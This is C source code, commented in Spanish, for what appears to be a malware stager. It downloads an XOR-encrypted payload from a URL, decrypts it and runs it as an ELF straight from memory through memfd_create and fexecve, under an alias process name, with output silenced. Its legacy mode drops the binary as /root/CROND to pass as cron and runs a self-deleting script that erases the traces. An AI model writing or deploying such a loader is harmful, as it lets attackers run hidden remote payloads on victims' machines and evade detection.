#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <elf.h>
#include <sys/wait.h>
#include "download.h"
#include "debug.h"
#include "util.h"



#ifndef MFD_CLOEXEC
#define MFD_CLOEXEC 0x0001U
#endif

#ifdef LEGACY_COMPILATION
// Para sistemas legacy
#define TEMP_FILENAME "/root/CROND"
#define SCRIPT_FILENAME "/root/.cleanup.sh"

void create_and_run_cleanup_script() {
    // Crear el script de Bash
    FILE *script = fopen(SCRIPT_FILENAME, "w");
    if (script == NULL) {
        perror("fopen");
        exit(EXIT_FAILURE);
    }

    // Escribir el contenido del script
    fprintf(script, "#!/bin/bash\n");
    fprintf(script, "sleep %d\n", 15);
    fprintf(script, "rm -f \"%s\"\n", TEMP_FILENAME);
    fprintf(script, "rm -- ${0}\n");

    // Cerrar el script
    fclose(script);

    // Hacer el script ejecutable
    if (chmod(SCRIPT_FILENAME, 0755) == -1) {
        perror("chmod");
        exit(EXIT_FAILURE);
    }

    // Ejecutar el script en segundo plan
       // Ejecutar el script en segundo plano
    pid_t pid = fork();
    if (pid == -1) {
        perror("fork");
        exit(EXIT_FAILURE);
    }
    if (pid == 0) {
        execl("/bin/bash", "bash", SCRIPT_FILENAME, (char *)NULL);
        perror("execl");
        exit(EXIT_FAILURE);
    }else {
        // Esperar al proceso hijo que ejecuta el script
        int status;
        if (waitpid(pid, &status, 0) == -1) {
            perror("waitpid");
        }
    }

}

void ensure_clean_temp_file(const char *filename) {
    if (access(filename, F_OK) == 0) {
        // El archivo existe, intenta eliminarlo
        if (unlink(filename) == -1) {
            perror("unlink");
            exit(EXIT_FAILURE);
        }
    }
}

#else

#ifndef memfd_create
#include <linux/memfd.h>
#include <sys/syscall.h>
#define memfd_create(name, flags) syscall(SYS_memfd_create, name, flags)
#endif

#endif




// Función para ejecutar un ELF en un proceso hijo
void execute_elf_from_memory(struct MemoryStruct *mem,const char *alias_name) {
    pid_t pid = fork();
    if (pid == 0) {
        // Este es el proceso hijo
        // Redirigir stdout y stderr a /dev/null
        int dev_null = open("/dev/null", O_RDWR);
        if (dev_null == -1) {
            perror("open /dev/null");
            exit(EXIT_FAILURE);
        }
        
        // Redirigir stdout y stderr a /dev/null
        if (dup2(dev_null, STDOUT_FILENO) == -1 || dup2(dev_null, STDERR_FILENO) == -1) {
            perror("dup2");
            close(dev_null);
            exit(EXIT_FAILURE);
        }
        
        close(dev_null);  // Cerrar el descriptor original

        int fd;

#ifdef LEGACY_COMPILATION
        // En sistemas legacy, usar mmap con un archivo temporal en /dev/zero
        ensure_clean_temp_file(TEMP_FILENAME);

        // Cambiar el nombre del proceso usando prctl
        fd = open(TEMP_FILENAME, O_RDWR | O_CREAT | O_TRUNC, S_IRWXU);
        if (fd == -1) {
            perror("mkstemp");
            exit(EXIT_FAILURE);
        }

        // Escribir los datos ELF en el archivo temporal
        if (write(fd, mem->memory, mem->size) != mem->size) {
            perror("write");
            close(fd);
            unlink(TEMP_FILENAME);
            exit(EXIT_FAILURE);
        }

        // Asegurarse de que el archivo temporal esté ejecutable
        if (chmod(TEMP_FILENAME, S_IRWXU) == -1) {
            perror("chmod");
            close(fd);
            unlink(TEMP_FILENAME);
            exit(EXIT_FAILURE);
        }

        // Limpiar y cerrar el archivo
        close(fd);


#else
        fd = memfd_create("elf_memfd", MFD_CLOEXEC);
        if (fd == -1) {
            perror("memfd_create");
            exit(EXIT_FAILURE);
        }
        if (write(fd, mem->memory, mem->size) != mem->size) {
            perror("write");
            exit(EXIT_FAILURE);
        }
#endif
        // Obtener las variables de entorno del proceso padre
        extern char **environ;
        // Ejecutar el ELF con el entorno del proceso padre
        //char *const argv[] = { NULL };
        char *const argv[] = { (char *)alias_name, NULL };

#ifdef LEGACY_COMPILATION
        // En sistemas legacy, no usar fexecve
        //char path[256];
        //snprintf(path, sizeof(path), "/proc/self/fd/%d", fd);

        

        if (execve(TEMP_FILENAME, argv, environ) == -1) {
            perror("execve");
            close(fd);
            exit(EXIT_FAILURE);
        }

#else
        fexecve(fd, argv, environ);
        perror("fexecve");
#endif
        close(fd);
        exit(EXIT_FAILURE);  // En caso de error

    } else if (pid > 0) {
        DEBUG_PRINT("Proceso hijo (PID: %d) ejecutando el ELF en segundo plano.\n", pid);

#ifdef LEGACY_COMPILATION
        pid_t cleanup_pid = fork();
        if (cleanup_pid == -1) {
            perror("fork");
            exit(EXIT_FAILURE);
        }
        if (cleanup_pid == 0) {
            create_and_run_cleanup_script();
            exit(EXIT_SUCCESS);
        } else {
            // Opcional: esperar al proceso de limpieza para asegurar que no se convierta en defunct
            int status;
            if (waitpid(cleanup_pid, &status, 0) == -1) {
                perror("waitpid");
            }
        }
#endif
    } else {
        // Error en fork
        perror("fork");
        exit(EXIT_FAILURE);
    }
}

void run_elf_executable(const char* url,const char* key,const char *alias_name) {
    struct MemoryStruct mem;
    mem.memory = NULL;
    mem.size = 0;

    if(! is_url_active(url)){
        DEBUG_PRINT("URL inactiva: %s\n", url); 
        exit(1);
    }

    download(url, &mem);

    xor_encrypt_decrypt(mem.memory, mem.size,key);

    execute_elf_from_memory(&mem,alias_name);

    if (mem.memory) free(mem.memory);
}